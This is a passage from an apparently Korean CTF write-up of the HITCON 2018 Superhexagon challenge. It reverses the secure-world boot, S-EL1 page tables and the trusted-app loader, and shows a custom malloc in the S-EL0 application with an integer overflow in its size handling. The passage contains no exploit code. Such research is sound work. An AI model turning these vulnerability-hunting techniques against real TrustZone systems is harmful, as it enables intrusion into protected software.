<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/393b2f37044c13b66e317cece00e6432.png" alt=""  />
</p>
<h4 id="bootloader">bootloader<a hidden class="anchor" aria-hidden="true" href="#bootloader">#</a></h4>
<p><img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/7142ee940bd610810b4ad8a86cf63896.png" alt=""  />
<br>
S-EL1을 보다가 못 읽겠어서 aarch32 manual을 찾아서 차근차근 읽어봤다.<br>
그랬더니 이미 정의된 주소로 핸들링을 수행한다고 한다.<br>
Secure VBAR을 확인해야한다.<br>
aarch64와 다르게 시스템 레지스터에 접근한다.<br>
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/82485996e995a7ee5ff25c63f3bb027e.png" alt=""  />
<br>
읽는 법은 위처럼 읽으면 된다.</p>
<p>VBAR 인자가 뭔지 잘 모르겠다.<br>
그래서 부트로더로 다시 돌아가서 secure world가 어떻게 초기화되는지 분석했다.<br>
kernel의 첫 페이지는 IPA 0x0에 매핑되어있다.<br>
그래서 실질적으로 rebase해서 EL1을 분석할 때는 초기 페이지들을 날리고 했어야했다.<br>
어쨋든 FUN_ffffffffc0008210에서 TEE OS initialize를 한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>    normal_ctx._536_4_ <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_00000120</span>(<span style="color:#ae81ff">0xe000000</span>,<span style="color:#ae81ff">1</span>,DAT_0e000008,<span style="color:#ae81ff">0xe400000</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,(uVar2 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x220</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe002430</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#f92672">!</span>bVar1;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>0xe000000가 보이는거 보니 boot argument 같은 것으로 보인다.<br>
BL1에서 0x68 만큼 copy한 데이터에 속한다.<br>
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/ece4fe83cb4391c6e24019fb2914e1ad.png" alt=""  />
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>  (secure_context<span style="color:#f92672">-&gt;</span>sysregs).SCTLR_EL1 <span style="color:#f92672">=</span> (ulong)((<span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0x18</span> <span style="color:#f92672">|</span> uVar1);
</span></span><span style="display:flex;"><span>  lVar2 <span style="color:#f92672">=</span> actlr_el1;
</span></span><span style="display:flex;"><span>  (secure_context<span style="color:#f92672">-&gt;</span>sysregs).ACTLR_EL1 <span style="color:#f92672">=</span> lVar2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (ns <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    (secure_context<span style="color:#f92672">-&gt;</span>sysregs).PMCR_EL0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x60</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* SCR_EL3.NS = 0 */</span>
</span></span><span style="display:flex;"><span>  secure_context<span style="color:#f92672">-&gt;</span>scr_el3 <span style="color:#f92672">=</span> (ulong)new_SCR;
</span></span><span style="display:flex;"><span>  secure_context<span style="color:#f92672">-&gt;</span>pc <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>  secure_context<span style="color:#f92672">-&gt;</span>spsr <span style="color:#f92672">=</span> (ulong)<span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span>  ...
</span></span></code></pre></div><p>위와 같이 secure context를 세팅한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">FUN_000001f8</span>(<span style="color:#66d9ef">long</span> param_1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">restore_sysregs</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">set_spelx</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_00000c90</span>(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>FUN_00000c90 내부적으로 시스템 레지스터 세팅하고 eret한다.<br>
어떤식으로 world switch가 일어나고 어디를 분석해야할지 알게 되었다.</p>
<h4 id="secure-world-pagewalk-gdbscript">Secure world pagewalk gdbscript<a hidden class="anchor" aria-hidden="true" href="#secure-world-pagewalk-gdbscript">#</a></h4>
<p>qemu에서 system registers를 보여주는데 오류가 있어서 직접 pagewalk를 하는 명령어 지원을 추가했다.<br>
메뉴얼은 적당히 보고 넘기면서 구현했다.<br>
AP[2:1] 모델이 조금 달라서 그부분도 신경쓰면서 구현했다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>  lvl1_idx <span style="color:#f92672">=</span> addr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">21</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x7f</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((<span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>trans_table_lvl1 <span style="color:#f92672">+</span> lvl1_idx <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(lvl1_idx <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8004004</span>)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    uVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_0800019c</span>(<span style="color:#f92672">&amp;</span>trans_table_lvl2 <span style="color:#f92672">+</span> lvl1_idx <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1000</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>trans_table_lvl1 <span style="color:#f92672">+</span> lvl1_idx <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> uVar1 <span style="color:#f92672">|</span> <span style="color:#ae81ff">3</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_08001944</span>(<span style="color:#f92672">&amp;</span>trans_table_lvl2 <span style="color:#f92672">+</span> lvl1_idx <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1000</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x1000</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  iVar2 <span style="color:#f92672">=</span> ((addr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0xc</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x1ff</span>) <span style="color:#f92672">+</span> lvl1_idx <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x200</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>trans_table_lvl2 <span style="color:#f92672">+</span> iVar2) <span style="color:#f92672">=</span> local_30 <span style="color:#f92672">|</span> phys_addr;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(iVar2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8005004</span>) <span style="color:#f92672">=</span> uStack_2c;
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>읽었던 메뉴얼이랑 세부 사항이 다른 것같아서 리버싱한 결과대로 구현했다.<br>
빠르게 구현하는데 초점을 맞춰서 구현이 제대로 되었는지는 잘 모르겠다.<br>
기존에 미리 작성했던 secure world의 물리 메모리를 읽는 스크립트를 같이 활용해서 구현했다.<br>
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/287c5219c962bb69887b5b29f0968ee8.png" alt=""  />
<br>
Exception vector tables를 포함한 text 부분이 PL1에서도 Read-Only 인 것을 보니 구현이 틀리지는 않았을 것 같다.</p>
<h3 id="reverse-engineering-s-el1">Reverse engineering S-EL1<a hidden class="anchor" aria-hidden="true" href="#reverse-engineering-s-el1">#</a></h3>
<p>VBAR은 0xe400000 이다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coprocessor_moveto2</span>(<span style="color:#ae81ff">0xf</span>,<span style="color:#ae81ff">0</span>,DAT_00001798 <span style="color:#f92672">+</span> (<span style="color:#ae81ff">0x16a0</span> <span style="color:#f92672">-</span> DAT_000017a8),<span style="color:#ae81ff">0</span>,in_cr2);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coprocessor_moveto2</span>(<span style="color:#ae81ff">0xf</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,in_cr2);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coprocessor_moveto</span>(<span style="color:#ae81ff">0xf</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0xff440400</span>,in_cr10,in_cr2);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coproc_moveto_Translation_table_control</span>(<span style="color:#ae81ff">0x80802504</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coproc_moveto_Domain_Access_Control</span>(DAT_000017ac);
</span></span><span style="display:flex;"><span>  ...
</span></span></code></pre></div><p>이런 괴랄한 코드는 어떻게 읽는지 모르겠어서 메뉴얼을 다시 읽었다.<br>
mcrr은 register 두 개를 쓰는거라 64-bit 시스템 레지스터에 쓴다고 한다.<br>
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/187578c32676fc0cc406c5744eb9d855.png" alt=""  />
<br>
이런식의 인코딩 차이가 있다.<br>
드디어 CRm만 가지고 어떻게 표를 보는지 알게 되었다.</p>
<p>bios.bin을 FEFFFFEA로 패치해서 무한루프를 만들어서 원하는 곳을 디버깅할 수 있다.<br>
Normal world에 대한 디버깅 능력을 상실했으니 무조건 secure world에서 멈춰야한다.</p>
<p>디버거가 시스템 레지스터를 제대로 표현하지 못한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>...  
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* TTBR0 */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coprocessor_moveto2</span>(<span style="color:#ae81ff">0xf</span>,<span style="color:#ae81ff">0</span>,DAT_0e401798 <span style="color:#f92672">+</span> (<span style="color:#ae81ff">0xe4016a0</span> <span style="color:#f92672">-</span> DAT_0e4017a8),<span style="color:#ae81ff">0</span>,in_cr2);
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* TTBR1 */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coprocessor_moveto2</span>(<span style="color:#ae81ff">0xf</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,in_cr2);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coprocessor_moveto</span>(<span style="color:#ae81ff">0xf</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0xff440400</span>,in_cr10,in_cr2);
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* TTBCR */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coproc_moveto_Translation_table_control</span>(<span style="color:#ae81ff">0x80802504</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* DACR */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coproc_moveto_Domain_Access_Control</span>(DAT_0e4017ac);
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* VBAR */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coprocessor_moveto</span>(<span style="color:#ae81ff">0xf</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,LONG_0e4017b0,in_cr12,in_cr0);
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">coproc_movefrom_Control</span>();
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* enable mmu */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coproc_moveto_Control</span>(uVar1 <span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>천천히 보니 어떤 행동을 하고 있는지 알 것 같다.</p>
<p>생각보다 변환 단계가 그리 많지 않아서 직접 손으로 해도 충분하다.<br>
VBAR는 VA 0x8000040 이지만, PA로 변환해보면 0xe400040이다.<br>
cps로 다시 supervisor mode로 변경해서 마저 TEE os initialization을 수행한다.<br>
이후 다시 VBAR을 정상적으로 세팅해준다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#ae81ff">0e401754</span> <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">0f</span>  <span style="color:#ae81ff">01</span>  ee    mcr        p15,<span style="color:#ae81ff">0x0</span> ,r0,cr1 ,cr0 ,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0e401758</span> <span style="color:#ae81ff">58</span>  d0  <span style="color:#ae81ff">9f</span>  e5    ldr        sp,[DAT_0e4017b8 ]                               <span style="color:#f92672">=</span> <span style="color:#ae81ff">08087000</span>h
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0e40175</span>c <span style="color:#ae81ff">3f</span>  fa  ff  fa    blx        FUN_0e400060                                     undefined <span style="color:#a6e22e">FUN_0e400060</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0e401760</span> <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">02</span>  f1    cps        <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">19</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0e401764</span> <span style="color:#ae81ff">50</span>  d0  <span style="color:#ae81ff">9f</span>  e5    ldr        sp,[DAT_0e4017bc ]                               <span style="color:#f92672">=</span> <span style="color:#ae81ff">08085000</span>h
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0e401768</span> <span style="color:#ae81ff">50</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">9f</span>  e5    ldr        r0,[DAT_0e4017c0 ]                               <span style="color:#f92672">=</span> <span style="color:#ae81ff">10000000</span>h
</span></span></code></pre></div><p>thumb로 모드를 변경한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#ae81ff">08001780</span> <span style="color:#ae81ff">3</span>c  <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">9f</span>  e5    ldr        r1,[DAT_080017c4 ]                               <span style="color:#f92672">=</span> <span style="color:#ae81ff">08000000</span>h
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">08001784</span> <span style="color:#ae81ff">02</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  e3    movw       r0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x2</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">08001788</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">48</span>  e3    movt       r0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x8300</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0800178</span>c <span style="color:#ae81ff">70</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">60</span>  e1    smc        <span style="color:#ae81ff">0x0</span>
</span></span></code></pre></div><p>그리고 다시 smc를 불러서 secure monitor로 돌아간다.<br>
의사코드만 읽다가 위 어셈블리 스니펫을 놓쳤었는데, 이거 때문에 하루종일 삽질했다.<br>
다시 secure monitor로 돌아가면 r1을 저장하며, TEE OS initialized 문구를 출력한다<br>
EL0에서 TA_Bin을 secure world로 업로드했었는데, 거기를 처리하는 로직을 찾아야한다.<br>
secure monitor 분석 결과를 기반으로 처리 로직은 vector_table + 0x20 를 따라가면 나온다는 것을알고 있다.<br>
entry 부터 쭉 따라가다 보면 바로 원하는 로직을 발견할 수 있다.<br>
여기서 업로드 로직을 확인해야 secure world에서 동작하는 user binary가 어떻게 동작하는지 알 수 있다.</p>
<h4 id="reversing-the-binary-loader--s-el0-binary-extraction">Reversing the binary loader &amp; S-EL0 binary extraction<a hidden class="anchor" aria-hidden="true" href="#reversing-the-binary-loader--s-el0-binary-extraction">#</a></h4>
<p>이후 커스텀 로더를 분석했고 바이너리 포맷을 알아냈다.<br>
non-secure world에서 전달된 바이너리의 무결성은 sha256으로 검증된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#ae81ff">0x1000</span> <span style="color:#ae81ff">0x1000</span> (<span style="color:#ae81ff">0x684</span>)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x2000</span> <span style="color:#ae81ff">0x1000</span> (<span style="color:#ae81ff">0xa8</span>)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x100000</span> <span style="color:#ae81ff">0x82000</span> (<span style="color:#ae81ff">0x81070</span>)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0xff8000</span> <span style="color:#ae81ff">0x8000</span> (<span style="color:#ae81ff">0x8000</span>)
</span></span></code></pre></div><p>위와 같이 매핑된다.<br>
권한은 직접 만든 secure world에서의 pagewalk 명령어로 확인할 수 있었다.<br>
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/428e3bfa84595f217f4a7f64abce7d06.png" alt=""  />
<br>
0x24만큼 헤더가 짤린 S-EL0.bin을 기드라에 로드해서 세그먼트 별로 잘라서 로드해주고 분석하면 된다.</p>
<h2 id="s-el0-secure-application">S-EL0, Secure application<a hidden class="anchor" aria-hidden="true" href="#s-el0-secure-application">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">interrupt_kernel</span>(<span style="color:#ae81ff">0xb</span>,<span style="color:#ae81ff">0x1001</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (tci_handle_arg<span style="color:#f92672">-&gt;</span>cmd <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* load */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_0000104e</span>(tci_handle_arg);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (tci_handle_arg<span style="color:#f92672">-&gt;</span>cmd <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* store */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_000010f6</span>(tci_handle_arg);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>내부적으로 store 로직에서 custom heap allocator를 이용한다.</p>
<h3 id="vulnerability-3">Vulnerability<a hidden class="anchor" aria-hidden="true" href="#vulnerability-3">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">uint32_t</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">malloc</span>(uint sz)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)is_heap_initialized <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_000012c2</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  cur_chunk <span style="color:#f92672">=</span> Arena.chunk_ptr;
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* size normalization */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (sz <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1f</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x20</span>) {
</span></span><span style="display:flex;"><span>    size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    size <span style="color:#f92672">=</span> sz <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1f</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffff0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x40000</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (iter_chunk <span style="color:#f92672">=</span> (Arena.freelist)<span style="color:#f92672">-&gt;</span>fd; iter_chunk <span style="color:#f92672">!=</span> Arena.freelist;
</span></span><span style="display:flex;"><span>        iter_chunk <span style="color:#f92672">=</span> iter_chunk<span style="color:#f92672">-&gt;</span>fd) {
</span></span><span style="display:flex;"><span>      FD <span style="color:#f92672">=</span> iter_chunk<span style="color:#f92672">-&gt;</span>fd;
</span></span><span style="display:flex;"><span>      BK <span style="color:#f92672">=</span> (freed_chunk <span style="color:#f92672">*</span>)iter_chunk<span style="color:#f92672">-&gt;</span>bk;
</span></span><span style="display:flex;"><span>      cur_sz <span style="color:#f92672">=</span> iter_chunk<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffc</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">&lt;=</span> cur_sz) {
</span></span><span style="display:flex;"><span>        BK<span style="color:#f92672">-&gt;</span>fd <span style="color:#f92672">=</span> FD;
</span></span><span style="display:flex;"><span>        FD<span style="color:#f92672">-&gt;</span>bk <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint32_t</span>)BK;
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)<span style="color:#f92672">&amp;</span>iter_chunk<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">+</span> cur_sz) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)<span style="color:#f92672">&amp;</span>iter_chunk<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">+</span> cur_sz) <span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* prev inuse bit set */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">&amp;</span>iter_chunk<span style="color:#f92672">-&gt;</span>bk;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    cur_sz <span style="color:#f92672">=</span> (Arena.chunk_ptr)<span style="color:#f92672">-&gt;</span>sz <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffc</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span> <span style="color:#f92672">&lt;=</span> cur_sz) {
</span></span><span style="display:flex;"><span>      next_chunk <span style="color:#f92672">=</span> (chunk <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)<span style="color:#f92672">&amp;</span>(Arena.chunk_ptr)<span style="color:#f92672">-&gt;</span>fd_const0 <span style="color:#f92672">+</span> size);
</span></span><span style="display:flex;"><span>      cur_sz_addr <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>(Arena.chunk_ptr)<span style="color:#f92672">-&gt;</span>sz;
</span></span><span style="display:flex;"><span>      Arena.chunk_ptr <span style="color:#f92672">=</span> next_chunk;
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>cur_sz_addr <span style="color:#f92672">=</span> size <span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>      next_chunk<span style="color:#f92672">-&gt;</span>sz <span style="color:#f92672">=</span> cur_sz <span style="color:#f92672">-</span> size <span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#f92672">&amp;</span>cur_chunk<span style="color:#f92672">-&gt;</span>payload;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    size <span style="color:#f92672">=</span> size <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xfff</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffff000</span>;
</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#f92672">=</span> (chunk <span style="color:#f92672">*</span>)<span style="color:#a6e22e">software_interrupt_2</span>(<span style="color:#ae81ff">0</span>,size,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0xffffffff</span>,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">!=</span> (chunk <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0xffffffff</span>) {
</span></span><span style="display:flex;"><span>      iVar1<span style="color:#f92672">-&gt;</span>sz <span style="color:#f92672">=</span> size <span style="color:#f92672">|</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#f92672">&amp;</span>iVar1<span style="color:#f92672">-&gt;</span>payload;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* unlink */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">uint32_t</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>구조체를 복원하고 분석하다가 integer overflow를 발견했다.<br>
취약점을 트리거하면 size가 너무 커지기에 무조건 SIGSEGV가 난다.<br>
이후 abort exception handler로 진입한다.</p>
